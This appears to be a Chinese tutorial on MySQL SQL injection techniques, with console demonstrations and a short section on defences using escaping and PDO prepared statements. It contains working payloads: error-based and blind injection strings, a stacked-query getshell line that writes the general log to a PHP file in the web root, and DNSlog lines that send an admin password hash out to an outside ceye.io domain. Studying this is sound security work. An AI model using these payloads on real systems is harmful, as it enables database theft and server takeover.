12345678MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。information_schema的表schemata中的列schema_name记录了所有数据库的名字information_schema的表tables中的列table_schema记录了所有数据库的名字information_schema的表tables中的列table_name记录了所有数据库的表的名字information_schema的表columns中的列table_schema记录了所有数据库的名字information_schema的表columns中的列table_name记录了所有数据库的表的名字information_schema的表columns中的列column_name记录了所有数据库的表的列的名字 常用函数right、left函数LEFT()函数是一个字符串函数,它返回具有指定长度的字符串的左边部分，我们在注入的时候，前台可能会限制回显字段，这时候我们可以使用这两个函数。 right同理 1234567891011121314151617181920212223mysql&gt; select right(&#39;1234567890&#39;,5);+-----------------------+| right(&#39;1234567890&#39;,5) |+-----------------------+| 67890 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select right(&#39;1234567890&#39;,2);+-----------------------+| right(&#39;1234567890&#39;,2) |+-----------------------+| 90 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select left(&#39;1234567890&#39;,5);+----------------------+| left(&#39;1234567890&#39;,5) |+----------------------+| 12345 |+----------------------+1 row in set (0.00 sec) isnull(exp)如果exp为null返回1，否侧返回0。 123456789101112131415mysql&gt; select isnull(1+1);+-------------+| isnull(1+1) |+-------------+| 0 |+-------------+1 row in set (0.00 sec)mysql&gt; select isnull(0);+-----------+| isnull(0) |+-----------+| 0 |+-----------+1 row in set (0.00 sec) 可以配合注入来判断文件是否存在以及是否有权限读取文件。 12mysql&gt; select * from math where id&#x3D;1 and updatexml(0,concat(0x7e,isnull(LOAD_FILE(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;2.txt&#39;)),0x7e),0);ERROR 1105 (HY000): XPATH syntax error: &#39;~1~&#39; ifnull(expr1,expr2)假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。 常用符号 位运算符 二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。 按位或 1234567mysql&gt; select 0|9879;+--------+| 0|9879 |+--------+| 9879 |+--------+1 row in set (0.00 sec) 按位异或 1234567mysql&gt; select 0^9879;+--------+| 0^9879 |+--------+| 9879 |+--------+1 row in set (0.00 sec) 按位与 1234567mysql&gt; select 0&amp;5464;+--------+| 0&amp;5464 |+--------+| 0 |+--------+1 row in set (0.00 sec) 0与任何的数字按位或、异或都是数字。 0与任何数字按位与都是0。 逻辑运算符 逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。 与运算符 123456789101112mysql&gt; select 2 and 0;+---------+| 2 and 0 |+---------+| 0 |+---------+ mysql&gt; select 2 and 1; +---------+ | 2 and 1 | +---------+ | 1 | +---------+ 或运算符 12345678910111213mysql&gt; select 2 or 0; +--------+ | 2 or 0 | +--------+ | 1 | +--------+ mysql&gt; select 2 or 1; +--------+ | 2 or 1 | +--------+ | 1 | +--------+ 非运算符 12345678910111213mysql&gt; select not 1; +-------+ | not 1 | +-------+ | 0 | +-------+ mysql&gt; select !0; +----+ | !0 | +----+ | 1 | +----+ 注入分类联合注入原理： 联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。 条件： 页面有回显、有占位符 占位符： 从数据库中取出某些输入能够显示到页面上的某一个位置。 步骤： 判断是否有注入 判断是数字型注入还是字符型注入 猜测查询列数 列数小,正常回显,num大,不回显。 寻找占位 获取所有数据库名 获取指定数据的所有表名 获取指定数据库的指定数据表的所有字段名 获取指定数据库的指定数据表的所有的内容 报错注入 BIGINT等数据类型溢出 原理： 在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。 在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。 12345678910111213141516171819202122mysql&gt; select ~0;+----------------------+| ~0 |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec)mysql&gt; select (select * from (select user())x);+----------------------------------+| (select * from (select user())x) |+----------------------------------+| root@localhost |+----------------------------------+1 row in set (0.00 sec)mysql&gt; select !(select * from (select user())x);+-----------------------------------+| !(select * from (select user())x) |+-----------------------------------+| 1 |+-----------------------------------+1 row in set (0.00 sec) 超出最大值就会报错： 12mysql&gt; select ~0+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39; exp()函数：当传入的数值大于709的时候就会报错。 12345678910mysql&gt; select exp(709);+-----------------------+| exp(709) |+-----------------------+| 8.218407461554972e307 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select exp(710);ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39; exp函数与整形溢出结合 mysql&gt;5.5.53时，则不能返回查询结果 12345678910mysql&gt; select version();+-----------+| version() |+-----------+| 5.7.26 |+-----------+1 row in set (0.00 sec)mysql&gt; select exp(~(select * from (select user())x));ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39; mysql5.5.47可以在报错中返回查询结果 12mysql&gt; select (select(!x-~0)from(select(select user())x)a);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39; xpath语法错误 原理： mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。 updatexml()函数 1234UPDATEXML (XMLdocument, XPathstring, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据 UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。 12mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39; extractvalue()对XML文档进行查询的函数 123ExtractValue(xml_frag, xpath_expr)第一个参数：可以传入目标xml文档第二个参数：用Xpath路径法表示的查找路径 寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。 12mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39; 主键重复 基本函数 rand() rand()随机产生一个0～1的数字 123456789101112131415mysql&gt; select rand();+----------------------+| rand() |+----------------------+| 0.006128073675677249 |+----------------------+1 row in set (0.01 sec)mysql&gt; select rand();+---------------------+| rand() |+---------------------+| 0.33123136435750067 |+---------------------+1 row in set (0.00 sec) rand(0)产生一个固定的0～1的数字 123456789101112131415mysql&gt; select rand(0);+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 |+---------------------+1 row in set (0.00 sec)mysql&gt; select rand(0);+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 |+---------------------+1 row in set (0.00 sec) 有几条数据就会返回几条随机数 123456789101112131415161718192021222324252627mysql&gt; select rand() from math;+----------------------+| rand() |+----------------------+| 0.6377726314941167 || 0.1951690951317261 || 0.06252761190992558 || 0.7271308048880946 || 0.44807121944434125 || 0.058963713291067366 || 0.9506049388559581 |+----------------------+7 rows in set (0.00 sec)mysql&gt; select * from math;+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 25 | gongcheng || 3 | chengxian || 25 | gongcheng |+------+-----------+7 rows in set (0.00 sec) floor()该函数返回X的最大整数值，但不能大于X 1234567mysql&gt; select floor(5.23);+-------------+| floor(5.23) |+-------------+| 5 |+-------------+1 row in set (0.00 sec) floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。 floor(rand(0)*2):具有确定性 floor(rand()*2):具有不确定性 原理： count()和group by在遇到rand()产生的重复值时报错。 Select name,count(*) from student group by name 这条语句的作用就是从student表中select出name和count(count会具体返回一个数字).这个数字的多少就是根据grop by 后面的name来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。 重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？ 发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count(*) 在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组 同理我们根据floor(rand(0)*2)进行分组—–这里要注意floor(rand(0)*2)执行之后是有规律的返回0或者1。 根据之前rand的顺序—011011011,我们来梳理一下为什么会报错 第一次计算执行一次产生0,表中不存在任何数据,然后开始插入 插入的时候会进行第二次计算,所以在执行一次产生1插入 第三次计算产生1因为第二次产生了1所以本次就无需在执行一次计算,直接在原来的基础上加1就可以,不会在进行一次计算 第四次产生0,原来的表中没有0所以要进行插入操作,会再一次计算产生1.所以会再次产生一个分组,注意是产生一个分组,不是单纯的产生一个数值 此时此刻就报错了。因为我们已经有了一个1分组了。注意是有了一个1分组了。在添加一个1分组会报错。 注意： sql语句在执行之后建立虚表分两种情况： 1、表中没有对应的列，执行一次查询，一次插入，floor(rand(0)*2)会被执行两次。 2、表中有对应的列，执行一次查询，一次插入，floor(rand(0)*2)只会被执行一次。 主键重复的最少前提就是虚拟表中要有三条数据才会产生重复,也就是group by执行至少三次,也就是对应的group by的表要有至少三条数据 几何函数 geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等函数 这些函数报错原理大多都相同，都是不满足参数需求而导致的报错。 DNSlog外带配合报错注入 作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。用ceye.io这个平台，这个平台就集成了Dnslog的功能。 12http:&#x2F;&#x2F;127.0.0.1&#x2F;mysql.php?id&#x3D;1 union select 1,2,load_file(CONCAT(&#39;\\\\&#39;,(SELECT hex(pass) FROM test.test_user WHERE name&#x3D;&#39;admin&#39; LIMIT 1),&#39;.mysql.steady.ceye.io\\abc&#39;)) load_file函数在Linux下是无法用来做dnslog攻击的。 其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式 \\sss.xxx\\test\\ 这也就解释了为什么CONCAT()函数拼接了4个\\了，因为转义的原因，4个就变\\成了2个\\，目的就是利用UNC路径。 tips： 因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 1UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。 Limit注入 常用函数 limit [位置偏移量,]行数 123456789101112131415161718mysql&gt; select * from math limit 1,2;+------+-----------+| id | name |+------+-----------+| 1 | 李明 || 1 | gongxinao |+------+-----------+2 rows in set (0.00 sec)mysql&gt; select * from math limit 1,3;+------+-----------+| id | name |+------+-----------+| 1 | 李明 || 1 | gongxinao || 1 | gongxinao |+------+-----------+3 rows in set (0.00 sec) benchmark benchmark函数有两个参数，第一个是执行次数，第二个是要测试的函数或者表达式 . limit注入 注入点 1select*from math limit 1,[可控点] 1select*from math order by id desc limit 1,2 limit后面能够拼接的函数只有into和procedure。 无order by关键字 使用union联合查询 1select id from math order by id desc limit 0,1 union select username from users; 报错注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 延时注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1) 只能使用BENCHMARK，而不能使用sleep 有order by关键字 无法使用union关键字，可尝试盲注或者报错 报错注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 延时注入(5.0.0&lt; MySQL &lt;5.6.6版本) 1select * from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1) 只能使用BENCHMARK，而不能使用sleep 堆叠注入定义 堆叠可以理解为多个sql语句放在一起，一起执行，在mysql命令行中我们的sql语句是以分号分割的，所以我们在sql注入的时候可以考虑，是否可以进行多语句执行注入。例如在mysql中 1234567891011121314151617181920mysql&gt; select * from math;select user();+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 25 | gongcheng || 3 | chengxian || 25 | gongcheng |+------+-----------+7 rows in set (0.00 sec)+----------------+| user() |+----------------+| root@localhost |+----------------+1 row in set (0.00 sec) 而union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 原理： mysql_query与mysqli-&gt;multi_query() mysql_query() 函数执行一条 MySQL 查询。 mysqli_multi_query()支持多查询，多查询使用多个分号进行分隔。 利用配合日志getshell 12id&#x3D;1;set global general_log&#x3D;&#39;on&#39;;set global general_log_file&#x3D;&#39;D:\\\\wwwroot\\\\web\\\\shell.php&#39;;#id&#x3D;1;select &#39;&lt;?php phpinfo();?&gt;&#39;;# 二次注入 原理： 用户第一次输入的数据，经过各种函数处理比如addslashes或者get_magic_quotes_gpc之后，仍然被原封不动的保存在数据库中，即存入了脏数据，当程序从数据库中取出脏数据的时候，进而产生了二次注入。 实例： sqlib-24 我们需要先去注册一个用户名为admin’ #的用户，用户名存入数据库，当我们需要修改当前用户的密码的时候，我们直接输入用户名，无须输入密码即可成功修改。 程序从数据库中取出脏数据后，执行的sql语句就是 1UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; 盲注 原理： 指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注。 盲注分为两类： 1.布尔盲注 布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。 2.时间盲注 界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。 常用函数 IF()1IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 MID()MID() 函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name; 12345678910111213141516171819202122232425mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,2);+----------------------+| MID(&#39;NowaMagic&#39;,1,2) |+----------------------+| No |+----------------------+1 row in set (0.00 sec)mysql&gt; SELECT MID(&#39;NowaMagic&#39;,1,3);+----------------------+| MID(&#39;NowaMagic&#39;,1,3) |+----------------------+| Now |+----------------------+1 row in set (0.00 sec)mysql&gt; SELECT MID(&#39;NowaMagic&#39;,0,3);+----------------------+| MID(&#39;NowaMagic&#39;,0,3) |+----------------------+| |+----------------------+1 row in set (0.00 sec)mysql&gt; substr() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);+-------------------------+| substr(&#39;NowaMagic&#39;,1,3) |+-------------------------+| Now |+-------------------------+1 row in set (0.01 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,1);+-------------------------+| substr(&#39;NowaMagic&#39;,1,1) |+-------------------------+| N |+-------------------------+1 row in set (0.01 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,2,1);+-------------------------+| substr(&#39;NowaMagic&#39;,2,1) |+-------------------------+| o |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,3,1);+-------------------------+| substr(&#39;NowaMagic&#39;,3,1) |+-------------------------+| w |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,3);+-------------------------+| substr(&#39;NowaMagic&#39;,1,3) |+-------------------------+| Now |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,1,2);+-------------------------+| substr(&#39;NowaMagic&#39;,1,2) |+-------------------------+| No |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,2);+-------------------------+| substr(&#39;NowaMagic&#39;,0,2) |+-------------------------+| |+-------------------------+1 row in set (0.00 sec)mysql&gt; SELECT substr(&#39;NowaMagic&#39;,0,1);+-------------------------+| substr(&#39;NowaMagic&#39;,0,1) |+-------------------------+| |+-------------------------+1 row in set (0.00 sec) case() 1234567891011121314151617181920212223mysql&gt; select case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 2 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| two |+------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 1 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| one |+------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end;+------------------------------------------------------------+| case 3 when 1 then &#39;one&#39; when 2 then &#39;two&#39; else &#39;more&#39; end |+------------------------------------------------------------+| more |+------------------------------------------------------------+1 row in set (0.00 sec) ord()ORD() 函数返回字符串第一个字符的 ASCII 值。 ELT(N,str1,str2,str3,…)如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。 123456mysql&gt; SELECT ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;);+---------------------------------------------------------+| ELT(1, &#39;ej&#39;, &#39;Heja&#39;, &#39;hej&#39;, &#39;foo&#39;) |+---------------------------------------------------------+| ej |+---------------------------------------------------------+ sleep()、BENCHMARK() 笛卡尔积 原理： 1AxB&#x3D;A和B中每个元素的组合所组成的集合，就是连接表 具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，利用系统自带的表和字段来完成攻击。 1SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C; 根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数。 实例： 配合if 1select * from table where id &#x3D; 1 and (if(substr(database(),1,1)&#x3D;&#39; &#39;, select count(*) from information_schema.columns A, information_schema.columns B,information_schema.columns C, null)) Get_lock() 加锁机制 在单数据库的环境下，如果想防止多个线程操作同一个表（多个线程可能分布在不同的机器上），可以使用这种方式，取表名为key，操作前进行加锁，操作结束之后进行释放，这样在多个线程的时候，即保证了单个表的串行操作，又保证了多个不同表的并行操作。 (1)GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间 (2)当调用 RELEASE_LOCK来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。 原理： 尝试对一个字段加锁 1234567mysql&gt; select get_lock(&#39;username&#39;,10); +-------------------------+| get_lock(&#39;username&#39;,10) | +-------------------------+ | 1 | +-------------------------+1 row in set (0.01 sec) 尝试开启另一个客户端 1234567mysql&gt; select get_lock(&#39;username&#39;,10);+-------------------------+| get_lock(&#39;username&#39;,10) |+-------------------------+| 0 |+-------------------------+1 row in set (10.01 sec) 实例： 对有一个字段加锁 1select * from ctf where flag &#x3D; 1 and get_lock(&#39;username&#39;,1); 再次加锁(配合if) 1select * from ctf where flag &#x3D; 1 and 1 and if(substr(database(),1,1),get_lock(&#39;username&#39;,5),null); 限制条件： 限制条件就是数据库的连接必须是持久连接，我们知道 mysql_connect() 连接数据库后开始查询，然后调用 mysql_close() 关闭与数据库的连接，也就是 web 服务器与数据库服务器连接的生命周期就是整个脚本运行的生命周期，脚本结束连接即断开，但是很明显这里我们要利用的是前一个连接对后一个连接的阻碍作用导致延时，所以这里的连接必须是持久的。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。 其他盲注函数–mysql中用regexp是区分大小写的 lpad和rpad函数 lpad(sourceStr, length, newStr)，将字符串newStr填补到sourceStr左边，直到sourceStr长度达到length。 1234567mysql&gt; select lpad(1,5,2);+-------------+| lpad(1,5,2) |+-------------+| 22221 |+-------------+1 row in set (0.00 sec) 配合盲注 123456789101112131415mysql&gt; select length(lpad(1,(select length(database())),2));+-----------------------------------------------+| length(lpad(1,(select length(database())),2)) |+-----------------------------------------------+| 4 |+-----------------------------------------------+1 row in set (0.01 sec)mysql&gt; select lpad(1,(select length(database())),2);+---------------------------------------+| lpad(1,(select length(database())),2) |+---------------------------------------+| 2221 |+---------------------------------------+1 row in set (0.00 sec) like和regexp: Like: % : 匹配0个或任意多个字符 _ : 匹配任意一个字符 1234567mysql&gt; select database();+------------+| database() |+------------+| test |+------------+1 row in set (0.00 sec) 判断第一个字符是否是t 1234567mysql&gt; select database() like &#39;t%&#39;;+----------------------+| database() like &#39;t%&#39; |+----------------------+| 1 |+----------------------+1 row in set (0.01 sec) 判断前两个字符是不是te 1234567mysql&gt; select database() like &#39;te%&#39;;+-----------------------+| database() like &#39;te%&#39; |+-----------------------+| 1 |+-----------------------+1 row in set (0.00 sec) 判断是否包含es两个字符 1234567mysql&gt; select database() like &#39;%es%&#39;;+------------------------+| database() like &#39;%es%&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) 判断有几个字符 123456789101112131415mysql&gt; select database() like &#39;_____&#39;;+-------------------------+| database() like &#39;_____&#39; |+-------------------------+| 0 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select database() like &#39;____&#39;;+------------------------+| database() like &#39;____&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) 判断第一个字符是否t 1234567mysql&gt; select database() like &#39;t___&#39;;+------------------------+| database() like &#39;t___&#39; |+------------------------+| 1 |+------------------------+1 row in set (0.00 sec) like配合盲注 123456789101112131415mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;t___&#39;),1,0);+------+-----------+| id | name |+------+-----------+| 1 | gongxinao || 1 | 李明 || 1 | gongxinao || 1 | gongxinao || 1 | 444 || 1 | 444 |+------+-----------+6 rows in set (0.02 sec)mysql&gt; select * from math where id &#x3D;1 and if((select database() like &#39;s___&#39;),1,0);Empty set (0.00 sec) 注意点就是如果匹配成功就会返回1否则就是0。 REGEXP: 盲注值正则表达式攻击(^、&amp;) 1234567891011121314151617181920212223242526272829303132333435363738mysql&gt; select name from math where id&#x3D;3;+-----------+| name |+-----------+| chengxian |+-----------+1 row in set (0.01 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^c&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;^c&#39; |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.01 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^s&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;^s&#39; |+-----------------------------------------------+| 0 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;n$&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;n$&#39; |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;an$&#39;;+------------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;an$&#39; |+------------------------------------------------+| 1 |+------------------------------------------------+1 row in set (0.00 sec) 123regexp &#39;^[a-z]&#39; #判断一个表的第一个字符串是否在a-z中regexp &#39;^r&#39; #判断第一个字符串是否为rregexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中(这里可以使用二分法) 提高盲注速度 DNSlog+盲注 https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html 原理： Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名www.test.com、t00ls.com.等的访问信息。 通过合适的sql语句，在数据库中执行之后，一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。 可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。 在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在ceye.io时，它会将这条域名信息转到相应的NS服务器上，而通过http://ceye.io我们就可以查询到这条DNS解析记录。 Microsoft SQL Server 123使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。UNC命名被应用于在局域网中访问文件服务器或者打印机，Windows系统的UNC语法具有通用的形式： \\\\ComputerName\\SharedFolder\\Resource攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。 条件： 1、secure_file_priv为空 2、目标系统是windows，能够使用UNC路径 实例： 构造sql语句 1SELECT LOAD_FILE(CONCAT(&#39;\\\\\\\\&#39;,(select database(),&#39;mysql.cmr1ua.ceye.io\\\\abc&#39;))) 四个\\，其中两个用来转义。DNSlog平台接受信息 宽字节注入造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。 GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。 比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。 应用程序的编码 以php为例子，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启default_charset编码时，php的默认编码为空， 123; PHP&#39;s built-in default is text&#x2F;htmldefault_mimetype &#x3D; &quot;text&#x2F;html&quot;;default_charset &#x3D; &quot;iso-8859-1&quot; 此时php会根据数据库中的编码自动来确定使用那种编码，可以使用&lt;?php $m=&quot;字&quot;; echo strlen($m);?&gt; 来进行判断，如果输出的值是3说明是utf-8编码。如果输出的值是2说明是gbk编码； SET NAMES &#39;GBK&#39;语句与这三个语句等价： 123mysql&gt;SET character_set_client &#x3D;&#39;GBK&#39;;mysql&gt;SET character_set_results &#x3D;&#39;GBK&#39;;mysql&gt;SET character_set_connection &#x3D;&#39;GBK&#39;; 三个语句的作用是： 当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。 当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。 使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，我们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子 123单引号（&#39;）&#x3D; （\\&#39;）双引号（&quot;） &#x3D; （\\&quot;）反斜杠（\\） &#x3D; （\\\\） 比如我们输入 1id&#x3D;%df%27 会被进行如下转换 %df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運’ 因为数据库设置了GBK编马，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。即是%df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。 防御： 对于宽字节编码，有一种最好的修补就是： （1）使用mysql_set_charset(GBK)指定字符集 （2）使用mysql_real_escape_string进行转义 1原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面%df和5c拼接为一个宽字节的问题，就是使用mysql_set_charset进行指定，他会指定当前连接的字符集。 （3）character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。 PDO技术mysql的预编译 当采用预编译操作时，首先将待执行的SQL，语句中的参数值用占位符替代。当带着占位符的SQL语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。 模拟预处理 模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本mysql)。如果模拟预处理开启，那么客户端程序内部会模拟mysql数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给mysql数据库执行 模拟预处理并没有实现SQL模板与参数的分离，但的确可以防止sql注入。模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。 非模拟预处理 1234567891011121314PDO::ATTR_EMULATE_PREPARES =&gt; false&lt;?php$params = [ PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION, PDO::ATTR_EMULATE_PREPARES =&gt; false,];$db = new PDO(&#x27;mysql:dbname=cat;host=127.0.0.1;&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, $params);try &#123; $link = $db-&gt;prepare(&#x27;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#x27;);&#125; catch (\\PDOException $e) &#123; var_dump($e);&#125; 